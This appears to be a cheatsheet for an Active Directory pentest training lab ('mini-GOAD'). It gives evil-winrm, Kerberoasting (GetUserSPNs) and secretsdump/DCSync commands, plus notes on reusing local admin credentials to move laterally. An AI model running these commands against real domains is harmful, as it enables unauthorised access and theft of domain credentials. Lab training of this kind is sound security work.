# Cheatsheet — Kill Chain (mini-GOAD)

## Targets

- **dc01 + dc02** — two domain controllers (primary + replica)
- **ws01 + ws02** — workstations with local-admin reuse

## Useful commands

```bash
evil-winrm -i <ws01> -u wadmin -p '<from readme>'     # local admin
# ws01 readme names ws02's admin → lateral hop
impacket-GetUserSPNs corp.pentrain.local/wadmin:'<pw>' -dc-ip <dc01> -request
impacket-secretsdump corp.pentrain.local/svc-rep:'<pw>'@<dc02>
```

## Concepts

- Local admin creds reused across workstations → hop laterally
- A DA service account (svc-rep) cracked once opens DCSync on the replica
- Check Desktop + C:\ops on every box — ops scripts leak the next hop
